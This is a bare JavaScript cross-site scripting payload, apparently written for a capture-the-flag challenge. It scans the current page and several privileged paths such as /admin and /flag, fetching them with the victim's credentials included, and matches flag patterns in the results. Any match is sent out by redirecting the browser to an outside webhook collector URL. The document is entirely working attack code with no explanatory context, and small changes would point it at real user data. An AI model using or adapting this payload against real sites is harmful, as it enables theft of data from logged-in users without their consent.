(async () => {
  const exfil = (tag, value) => {
    location.href =
      'https://webhooksite.net/ae3222ba-a10c-4885-942d-a1e673df5116?tag=' +
      encodeURIComponent(tag) +
      '&d=' +
      encodeURIComponent(value);
  };

  const pats = [
    /flag\{[^}]+\}/i,
    /ctf\{[^}]+\}/i,
    /hackcon\{[^}]+\}/i
  ];

  const findFlag = (txt) => {
    for (const re of pats) {
      const m = txt.match(re);
      if (m) return m[0];
    }
    return null;
  };

  try {
    const html = document.documentElement.outerHTML;
    const hit = findFlag(html);
    if (hit) return exfil('flag', hit);
  } catch (e) {}

  for (const p of ['/', '/admin', '/dashboard', '/flag', '/feedback']) {
    try {
      const t = await fetch(p, { credentials: 'include' }).then(r => r.text());
      const hit = findFlag(t);
      if (hit) return exfil(p, hit);
    } catch (e) {}
  }
})();
